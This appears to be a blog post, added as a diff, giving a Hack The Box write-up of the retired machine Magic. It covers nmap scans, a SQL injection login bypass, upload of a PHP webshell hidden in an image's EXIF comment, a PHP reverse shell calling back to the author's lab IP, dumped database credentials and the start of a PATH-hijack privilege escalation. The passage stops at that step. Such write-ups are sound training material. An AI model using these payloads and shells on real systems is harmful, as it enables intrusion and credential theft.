@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="author" content="Daniel Cano">
+<meta name="description" content="Writeup about the Hackthebox retired machine Magic 10.10.10.185">
+<meta name="keywords" content="hacking, technology, programming">
+<meta name="referrer" content="always">
+<meta property="og:description" content="Writeup about the Hackthebox retired machine Magic 10.10.10.185">
+<meta property="og:title" content="Writeup Hackthebox HTB Magic">
+<meta property="og:url" content="https://u915.net/posts/2020/10/writeup-hackthebox-htb-magic/">
+<meta property="og:image" content="https://u915.net/images/logo_small.png" />
+<title>Writeup Hackthebox HTB Magic - u915</title>
+<link rel="stylesheet" type="text/css" href="/css/main.css">
+<link rel="icon" href="/images/favicon.png" type="image/x-icon">
+<link rel="shortcut icon" href="/images/favicon_48_48.png">
+</head>
+<body>
+<header>
+  <div class="blog-header">
+    <h1><a href="https://u915.net/">u915</a></h1>
+    <div><a href="https://u915.net/"><img src="/images/logo_small.png" class="bloglogo"></img></a></div><h4>Daniel Cano Merchán - Hacking &amp; Tech</h4>
+  </div>
+  <nav><a href="/">Index</a><a href="/posts/">Posts</a><a href="/tags/">Tags</a><a href="/hacking-tools/">Tools</a><a href="/about/">About</a></nav>
+</header>
+<main>
+  <article>
+    <div class="title">
+  <h1>Writeup Hackthebox HTB Magic</h1>
+  </div>
+<div class="meta">
+  <div class="meta-bar">2020-10-08
+  <span><a href="https://u915.net/tags/hacking/">#Hacking</a></span>
+      <span><a href="https://u915.net/tags/hackthebox/">#Hackthebox</a></span>
+      <span><a href="https://u915.net/tags/pentesting/">#Pentesting</a></span>
+      </div>
+  </div>
+<div class="content">
+  <h2 id="0---basic-info">0 - Basic info</h2>
+<p>OS: Linux</p>
+<p>IP: 10.10.10.185</p>
+<h2 id="1---reconnaissance-and-enumeration">1 - Reconnaissance and enumeration</h2>
+<pre><code>sudo nmap -sS -sV -sC -O 10.10.10.185
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-02 17:21 CEST
+Nmap scan report for 10.10.10.185
+Host is up (0.041s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
+|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
+|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Magic Portfolio
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=8/2%OT=22%CT=1%CU=41682%PV=Y%DS=2%DC=I%G=Y%TM=5F26D9F1
+OS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(
+OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11
+OS:NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
+OS:R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
+OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
+OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
+OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
+OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
+OS:S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.68 seconds
+
+nmap -Pn -n -sV --script vuln 10.10.10.185
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-02 17:23 CEST
+Nmap scan report for 10.10.10.185
+Host is up (0.042s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+| http-cookie-flags: 
+|   /login.php: 
+|     PHPSESSID: 
+|_      httponly flag not set
+| http-csrf: 
+| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.185
+|   Found the following possible CSRF vulnerabilities: 
+|     
+|     Path: http://10.10.10.185:80/login.php
+|     Form id: login-form
+|_    Form action: 
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+| http-enum: 
+|_  /login.php: Possible admin folder
+| http-fileupload-exploiter: 
+|   
+|     Couldn't find a file-type field.
+|   
+|_    Couldn't find a file-type field.
+| http-internal-ip-disclosure: 
+|_  Internal IP Leaked: 127.0.1.1
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
+| vulners: 
+|   cpe:/a:apache:http_server:2.4.29: 
+|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211
+|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
+|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715
+|       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082
+|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217
+|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
+|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
+|       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934
+|       CVE-2019-10081  5.0     https://vulners.com/cve/CVE-2019-10081
+|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220
+|       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196
+|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199
+|       CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333
+|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710
+|       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197
+|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
+|       CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763
+|_      CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 39.82 seconds
+</code></pre>
+<p>The initial recon shows that is vulnerable to some CVEs but nothing useful at first place, i did not check every CVE.</p>
+<p>Checking manually the port 80 shows that it is a blog, with a image gallery, interesting technology involved:</p>
+<pre><code>/*
+    Parallelism by HTML5 UP
+    html5up.net | @ajlkn
+    Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
+*/
+</code></pre>
+<p>On the corner: Please login, to upload images.</p>
+<p>Inside the path <em>/login</em> there is a form, asking for username and password. I tested default credentials like <em>admin/admin</em> , <em>admin/magic</em> but did not work.</p>
+<h2 id="2---vulnerability-identification">2 - Vulnerability Identification</h2>
+<p>The form is vulnerable to SQLi.</p>
+<h3 id="manual-check">Manual check</h3>
+<p>On the password input text field:</p>
+<pre><code>' or '1'='1
+</code></pre>
+<h2 id="3---exploit">3 - Exploit</h2>
+<h3 id="sqlmap">SQLmap</h3>
+<pre><code>sqlmap -u &quot;http://10.10.10.185/login.php&quot; --data &quot;username=1&amp;password=2&quot; -p &quot;username,password&quot; --method POST --risk 3
+    ___
+       __H__                                                                                                                                                                                                                               
+ ___ ___[.]_____ ___ ___  {1.4.7#stable}                                                                                                                                                                                                   
+|_ -| . [)]     | .'| . |                                                                                                                                                                                                                  
+|___|_  [)]_|_|_|__,|  _|                                                                                                                                                                                                                  
+      |_|V...       |_|   http://sqlmap.org                                                                                                                                                                                                
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 17:56:42 /2020-08-02/
+
+[17:56:42] [INFO] testing connection to the target URL
+you have not declared cookie(s), while server wants to set its own ('PHPSESSID=0n7mgh94q59...e8b34as73u'). Do you want to use those [Y/n] Y
+[17:56:46] [INFO] testing if the target URL content is stable
+[17:56:47] [INFO] target URL content is stable
+[17:56:47] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
+[17:56:47] [INFO] testing for SQL injection on POST parameter 'username'
+[17:56:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[17:56:48] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[17:56:49] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[17:56:49] [INFO] testing 'MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[17:56:49] [INFO] testing 'MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[17:56:49] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[17:56:50] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
+[17:56:50] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[17:56:50] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[17:56:51] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (XMLType)'
+[17:56:51] [INFO] testing 'MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)'
+[17:56:51] [INFO] testing 'Generic inline queries'
+[17:56:51] [INFO] testing 'PostgreSQL &gt; 8.1 stacked queries (comment)'
+[17:56:51] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[17:56:52] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[17:56:52] [INFO] testing 'MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)'
+[17:56:52] [INFO] testing 'MySQL &gt;= 5.0.12 OR time-based blind (query SLEEP)'
+[17:56:52] [INFO] testing 'PostgreSQL &gt; 8.1 AND time-based blind'
+[17:56:53] [INFO] testing 'PostgreSQL &gt; 8.1 OR time-based blind'
+[17:56:53] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[17:56:53] [INFO] testing 'Oracle AND time-based blind'
+[17:56:54] [INFO] testing 'Oracle OR time-based blind'
+it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] n
+[17:56:57] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+got a 302 redirect to 'http://10.10.10.185:80/upload.php'. Do you want to follow? [Y/n] Y
+redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] N
+[17:57:14] [WARNING] POST parameter 'username' does not seem to be injectable
+[17:57:14] [WARNING] heuristic (basic) test shows that POST parameter 'password' might not be injectable
+[17:57:14] [INFO] testing for SQL injection on POST parameter 'password'
+[17:57:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[17:57:14] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[17:57:15] [INFO] POST parameter 'password' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable (with --code=302)
+[17:57:17] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) value? [Y/n] Y
+[17:57:29] [INFO] testing 'MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[17:57:29] [INFO] testing 'MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[17:57:30] [INFO] testing 'MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[17:57:30] [INFO] testing 'MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[17:57:30] [INFO] testing 'MySQL &gt;= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[17:57:30] [INFO] testing 'MySQL &gt;= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[17:57:30] [INFO] testing 'MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[17:57:30] [INFO] testing 'MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[17:57:30] [INFO] testing 'MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[17:57:30] [INFO] testing 'MySQL &gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[17:57:30] [INFO] testing 'MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[17:57:30] [INFO] testing 'MySQL &gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[17:57:30] [INFO] testing 'MySQL &gt;= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[17:57:31] [INFO] testing 'MySQL &gt;= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
+[17:57:31] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
+[17:57:31] [INFO] testing 'MySQL &gt;= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[17:57:31] [INFO] testing 'MySQL &gt;= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
+[17:57:31] [INFO] testing 'MySQL &gt;= 5.5 error-based - Parameter replace (EXP)'
+[17:57:31] [INFO] testing 'MySQL &gt;= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
+[17:57:31] [INFO] testing 'MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)'
+[17:57:31] [INFO] testing 'MySQL &gt;= 5.1 error-based - Parameter replace (UPDATEXML)'
+[17:57:31] [INFO] testing 'MySQL &gt;= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
+[17:57:31] [INFO] testing 'Generic inline queries'
+[17:57:31] [INFO] testing 'MySQL inline queries'
+[17:57:31] [INFO] testing 'MySQL &gt;= 5.0.12 stacked queries (comment)'
+[17:57:31] [INFO] testing 'MySQL &gt;= 5.0.12 stacked queries'
+[17:57:31] [INFO] testing 'MySQL &gt;= 5.0.12 stacked queries (query SLEEP - comment)'
+[17:57:31] [INFO] testing 'MySQL &gt;= 5.0.12 stacked queries (query SLEEP)'
+[17:57:31] [INFO] testing 'MySQL &lt; 5.0.12 stacked queries (heavy query - comment)'
+[17:57:31] [INFO] testing 'MySQL &lt; 5.0.12 stacked queries (heavy query)'
+[17:57:31] [INFO] testing 'MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)'
+[17:57:31] [INFO] testing 'MySQL &gt;= 5.0.12 OR time-based blind (query SLEEP)'
+[17:57:31] [INFO] testing 'MySQL &gt;= 5.0.12 AND time-based blind (SLEEP)'
+[17:57:31] [INFO] testing 'MySQL &gt;= 5.0.12 OR time-based blind (SLEEP)'
+[17:57:32] [INFO] testing 'MySQL &gt;= 5.0.12 AND time-based blind (SLEEP - comment)'
+[17:57:32] [INFO] testing 'MySQL &gt;= 5.0.12 OR time-based blind (SLEEP - comment)'
+[17:57:32] [INFO] testing 'MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP - comment)'
+[17:57:32] [INFO] testing 'MySQL &gt;= 5.0.12 OR time-based blind (query SLEEP - comment)'
+[17:57:32] [INFO] testing 'MySQL &lt; 5.0.12 AND time-based blind (heavy query)'
+[17:57:32] [INFO] testing 'MySQL &lt; 5.0.12 OR time-based blind (heavy query)'
+[17:57:32] [INFO] testing 'MySQL &lt; 5.0.12 AND time-based blind (heavy query - comment)'
+[17:57:32] [INFO] testing 'MySQL &lt; 5.0.12 OR time-based blind (heavy query - comment)'
+[17:57:32] [INFO] testing 'MySQL &gt;= 5.0.12 RLIKE time-based blind'
+[17:57:32] [INFO] testing 'MySQL &gt;= 5.0.12 RLIKE time-based blind (comment)'
+[17:57:32] [INFO] testing 'MySQL &gt;= 5.0.12 RLIKE time-based blind (query SLEEP)'
+[17:57:32] [INFO] testing 'MySQL &gt;= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
+[17:57:32] [INFO] testing 'MySQL AND time-based blind (ELT)'
+[17:57:32] [INFO] testing 'MySQL OR time-based blind (ELT)'
+[17:57:32] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
+[17:57:32] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
+[17:57:32] [INFO] testing 'MySQL &gt;= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[17:57:33] [INFO] testing 'MySQL &gt;= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[17:57:33] [INFO] testing 'MySQL &gt;= 5.0.12 time-based blind - Parameter replace'
+[17:57:33] [INFO] testing 'MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)'
+[17:57:33] [INFO] testing 'MySQL &lt; 5.0.12 time-based blind - Parameter replace (heavy queries)'
+[17:57:33] [INFO] testing 'MySQL time-based blind - Parameter replace (bool)'
+[17:57:33] [INFO] testing 'MySQL time-based blind - Parameter replace (ELT)'
+[17:57:33] [INFO] testing 'MySQL time-based blind - Parameter replace (MAKE_SET)'
+[17:57:33] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[17:57:33] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[17:57:35] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+[17:57:36] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
+[17:57:38] [INFO] target URL appears to be UNION injectable with 3 columns
+[17:57:40] [WARNING] if UNION based SQL injection is not detected, please consider and/or try to force the back-end DBMS (e.g. '--dbms=mysql') 
+[17:57:40] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
+[17:57:42] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
+[17:57:43] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
+[17:57:44] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
+[17:57:46] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
+[17:57:47] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
+[17:57:48] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
+[17:57:50] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
+[17:57:51] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
+[17:57:51] [INFO] checking if the injection point on POST parameter 'password' is a false positive
+POST parameter 'password' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 503 HTTP(s) requests:
+---
+Parameter: password (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: username=1&amp;password=-9525' OR 6168=6168 AND 'nBvw'='nBvw
+---
+[17:58:01] [INFO] testing MySQL
+[17:58:02] [INFO] confirming MySQL
+[17:58:02] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL &gt;= 5.0.0
+[17:58:02] [INFO] fetched data logged to text files under '/home/u915/.local/share/sqlmap/output/10.10.10.185'
+
+[*] ending @ 17:58:02 /2020-08-02/
+</code></pre>
+<h3 id="login-bypass">Login Bypass</h3>
+<p>Both methods worked to bypass the authentication:</p>
+<pre><code>admin/password=-9525' OR 6168=6168 AND 'nBvw'='nBvw
+</code></pre>
+<h3 id="image-gallery-and-webshell">Image gallery and webshell</h3>
+<p>Inside there is a form to upload images to the gallery.</p>
+<p>I tried to upload php webshells but there is a filter extension. Saying that only jpeg,jpg and png are allowed.</p>
+<p>Also, I tried to upload php code inside the file with a image extension but it is filtering the content too.</p>
+<p><img src="/images/posts/htb_magic_1.png" alt="alt text" title="HTB Magic uploading images with custom payload"></p>
+<p>I tried custom common payloads using images, to bypass the file extension, and I could upload images using double extension:</p>
+<pre><code>ok.php.png
+</code></pre>
+<p><img src="/images/posts/htb_magic_2.png" alt="alt text" title="HTB Magic php double extension Bypass"></p>
+<p>Bypassing the filter, looks like the file extension is under control, now I need to upload PHP code.</p>
+<p>I am using exiftool to generate a custom payload inside the image, to generate a basic webshell:</p>
+<pre><code>exiftool -Comment=&quot;&lt;?php echo '&lt;form action=\''.\$PHP_SELF.'\' method=\'post\'&gt;Command:&lt;input type=\'text\' name=\'cmd\'&gt;&lt;input type=\'submit\'&gt;&lt;/form&gt;'; if(\$_POST){system(\$_POST['cmd']);} __halt_compiler();&quot; ok2.jpeg
+</code></pre>
+<p><img src="/images/posts/htb_magic_3.png" alt="alt text" title="HTB Magic php Webshell uploaded"></p>
+<p>Great! I got the webshell uploaded</p>
+<pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<h3 id="reverse-shell">Reverse shell</h3>
+<p>Upgrade the shell, because working on the webshell is hard:</p>
+<p>Listener on my machine:</p>
+<pre><code>nc -lvp 1234
+
+php -r '$sock=fsockopen(&quot;10.10.14.11&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'
+</code></pre>
+<p>With the reverse shell enabled I started enumerating again.</p>
+<pre><code>$ cat db.php5   
+&lt;?php
+class Database
+{
+    private static $dbName = 'Magic' ;
+    private static $dbHost = 'localhost' ;
+    private static $dbUsername = 'theseus';
+    private static $dbUserPassword = 'iamkingtheseus';
+
+    [...]
+</code></pre>
+<p>Username/Password inside the file <em>/var/www/Magic/db.php5</em></p>
+<p>I tried to use the username and password to log in on the system but without sucesss.</p>
+<p>So, with the db credentials, the next step is MySQL.</p>
+<h3 id="working-with-mysql">Working with MySQL</h3>
+<pre><code>ps -ef | grep mysql
+mysql     1133     1  0 08:18 ?        00:00:04 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
+www-data  2408  2386  0 10:03 pts/0    00:00:00 grep mysql
+
+
+$ locate mysql | grep bin
+locate mysql | grep bin
+/etc/apparmor.d/usr.sbin.mysqld
+/etc/apparmor.d/cache/usr.sbin.mysqld
+/etc/apparmor.d/local/usr.sbin.mysqld
+/usr/bin/mysql_config_editor
+/usr/bin/mysql_embedded
+/usr/bin/mysql_install_db
+/usr/bin/mysql_plugin
+/usr/bin/mysql_secure_installation
+/usr/bin/mysql_ssl_rsa_setup
+/usr/bin/mysql_tzinfo_to_sql
+/usr/bin/mysql_upgrade
+/usr/bin/mysqladmin
+/usr/bin/mysqlanalyze
+/usr/bin/mysqlbinlog
+/usr/bin/mysqlcheck
+/usr/bin/mysqld_multi
+/usr/bin/mysqld_safe
+/usr/bin/mysqldump
+/usr/bin/mysqldumpslow
+/usr/bin/mysqlimport
+/usr/bin/mysqloptimize
+/usr/bin/mysqlpump
+/usr/bin/mysqlrepair
+/usr/bin/mysqlreport
+/usr/bin/mysqlshow
+/usr/bin/mysqlslap
+/usr/sbin/mysqld
+/usr/share/man/man1/mysqlbinlog.1.gz
+</code></pre>
+<p>Dumping the Mysql database:</p>
+<pre><code>$ /usr/bin/mysqldump -u theseus -p Magic
+/usr/bin/mysqldump -u theseus -p Magic
+Enter password: iamkingtheseus
+
+-- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)
+--
+-- Host: localhost    Database: Magic
+-- ------------------------------------------------------
+-- Server version       5.7.29-0ubuntu0.18.04.1
+
+/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
+/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
+/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
+/*!40101 SET NAMES utf8 */;
+/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
+/*!40103 SET TIME_ZONE='+00:00' */;
+/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
+/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
+/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
+/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
+
+--
+-- Table structure for table `login`
+--
+
+DROP TABLE IF EXISTS `login`;
+/*!40101 SET @saved_cs_client     = @@character_set_client */;
+/*!40101 SET character_set_client = utf8 */;
+CREATE TABLE `login` (
+  `id` int(6) NOT NULL AUTO_INCREMENT,
+  `username` varchar(50) NOT NULL,
+  `password` varchar(100) NOT NULL,
+  PRIMARY KEY (`id`),
+  UNIQUE KEY `username` (`username`)
+) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
+/*!40101 SET character_set_client = @saved_cs_client */;
+
+--
+-- Dumping data for table `login`
+--
+
+LOCK TABLES `login` WRITE;
+/*!40000 ALTER TABLE `login` DISABLE KEYS */;
+INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
+/*!40000 ALTER TABLE `login` ENABLE KEYS */;
+UNLOCK TABLES;
+/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;
+
+/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
+/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
+/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
+/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
+/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
+/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
+/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;
+
+-- Dump completed on 2020-08-02 10:11:09
+</code></pre>
+<p>Inside there is another username and password:</p>
+<pre><code>INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
+</code></pre>
+<h3 id="user-theseus-and-user-flag">User theseus and user flag</h3>
+<p>Testing the new credentials:</p>
+<pre><code>$ su theseus
+su theseus
+Password: Th3s3usW4sK1ng
+
+theseus@ubuntu:/tmp/test$ 
+
+
+theseus@ubuntu:~$ cat user.txt
+cat user.txt
+304[...]710
+</code></pre>
+<p>User flag done.</p>
+<h2 id="4---post-exploitation-and-privilege-scalation">4 - Post-Exploitation and privilege scalation</h2>
+<p>Now is time to scalate priveleges.</p>
+<h3 id="sudo">Sudo</h3>
+<p>Testing sudo:</p>
+<pre><code>theseus@ubuntu:~$ sudo -l
+sudo -l
+[sudo] password for theseus: Th3s3usW4sK1ng
+
+Sorry, user theseus may not run sudo on ubuntu.
+</code></pre>
+<p>No sudo allowed :(</p>
+<h3 id="linenum-and-sysinfo">LinEnum and sysinfo</h3>
+<p>I uploaded <em>LinEnum.sh</em> and i got this not standard binary on Linux:</p>
+<pre><code>-rwsr-x--- 1 root users 22040 Oct 21  2019 /bin/sysinfo
+</code></pre>
+<p>Also theseus has this group:</p>
+<pre><code>theseus@ubuntu:/var/www/Magic/images/uploads$ id
+id
+uid=1000(theseus) gid=1000(theseus) groups=1000(theseus),100(users)
+theseus@ubuntu:/var/www/Magic/images/uploads$ groups
+groups
+theseus users
+</code></pre>
+<p>Checking what sysinfo does:</p>
+<p><a href="https://www.binarytides.com/linux-commands-hardware-info/">https://www.binarytides.com/linux-commands-hardware-info/</a></p>
+<p>Looks like is using standard Linux binaries to report hardware info I recognise the standard output of the command <em>free</em> and it is executed as root using a SUID bit because -rwsr.</p>
+<p>Checking theseus path:</p>
+<pre><code>theseus@ubuntu:/var/www/Magic/images/uploads$ echo $PATH
+echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+theseus@ubuntu:/var/www/Magic/images/uploads$ PATH=/tmp:$PATH
+PATH=/tmp:$PATH
+theseus@ubuntu:/var/www/Magic/images/uploads$ echo $PATH
+echo $PATH
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
